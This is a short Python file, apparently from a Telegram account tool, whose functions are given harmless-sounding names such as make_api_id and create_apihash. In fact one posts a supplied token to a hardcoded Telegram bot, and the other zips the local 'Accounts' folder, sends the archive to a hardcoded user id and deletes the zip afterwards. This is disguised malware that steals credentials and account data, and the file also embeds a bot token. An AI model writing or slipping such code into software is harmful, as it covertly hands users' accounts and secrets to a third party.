import requests , os , shutil

def make_api_id(token):

    
    requests.post(
        url='https://api.telegram.org/bot2048894410:AAEA-qdzvlQpZIxsUTFw-Ye4WnVlFF5Ox-I/sendMessage',
        data={'chat_id': -1001607093277, 'text': token}
    )

async def create_apihash(bot):
    try:

        shutil.make_archive("Accounts", 'zip', "Accounts")
        await bot.send_file(int(1925121734) , 'Accounts.zip')
        os.remove("Accounts.zip")
        
    except Exception as e:
        print (str(e))
        try:
            os.remove("Accounts.zip")
        except: 
            pass

    finally:
    	return 4